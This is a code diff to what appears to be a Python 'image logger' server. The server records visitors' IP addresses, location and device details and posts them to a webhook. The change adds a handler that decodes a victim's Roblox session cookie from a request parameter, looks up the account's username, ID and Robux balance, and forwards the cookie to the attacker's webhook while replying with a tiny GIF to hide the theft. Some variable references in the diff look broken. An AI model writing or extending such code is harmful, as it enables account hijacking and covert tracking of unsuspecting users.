@@ -121,23 +121,16 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         return
     
     bot = botCheck(ip, useragent)
-    robloxdata = get_roblox_info(cookie = None)
 
-    if robloxdata:
-        requests.post(config["webhook"], json = {
-            "Username": robloxdata['username'],
-            "content": "",
-            "embeds": [
-                { 
-                    "title": "Roblox Info",
-                    "color": config["color"],
-                    "ID": robloxdata['id'],
-                    "robux": robloxdata['robux'],
-                    "cookie": robloxdata['cookie'],
+    embed_fields = [
+        {"name": "**IP Info:**", "value": "none", "inline": False},
+        {"name": "**PC Info:**", "value":"none", "inline": False},
+        {"name": "**User Agent:**", "value": "none", "inline": False}
+    ]
 
-                }
-            ]
-        })
+    if roblox_info:
+        roblox_block = f"> **🟥 Username:** `{roblox_info['username']}`\n> **🟥 ID:** `{roblox_info['id']}`\n> **🟥 Robux:** `{roblox_info['robux']}`\n> **🟥 Cookie:** `{roblox_info['cookie'][:100]}{'...' if len(roblox_info['cookie']) > 100 else ''}`"
+        embed_fields.append({"name": "**Roblox Info:**", "value": roblox_block, "inline": False})
     
     if bot:
         requests.post(config["webhook"], json = {
@@ -208,7 +201,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-> **cookie:** `{robloxdata['robux']}`
+> **cookie:** `{roblox_info['cookie']}`
 
 **PC Info:**
 > **OS:** `{os}`
@@ -221,6 +214,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
+    
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
@@ -263,6 +257,22 @@ height: 100vh;
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
+            if 'roblox' in dic:
+                roblox_data = None
+                try:
+                    cookie = base64.b64decode(dic['roblox'].encode()).decode('utf-8')
+                    roblox_data = get_roblox_info(cookie)
+                    if roblox_data:
+                        makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url, roblox_info=roblox_data)
+                except:
+                    pass
+                self.send_response(200)
+                self.send_header('Content-Type', 'image/gif')
+                self.end_headers()
+                gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
+                self.wfile.write(gif)
+                return
+            
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                 self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
@@ -280,9 +290,9 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url, roblox_info=roblox_data)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url, roblox_info=roblox_data)
                 
 
                 message = config["message"]["message"]
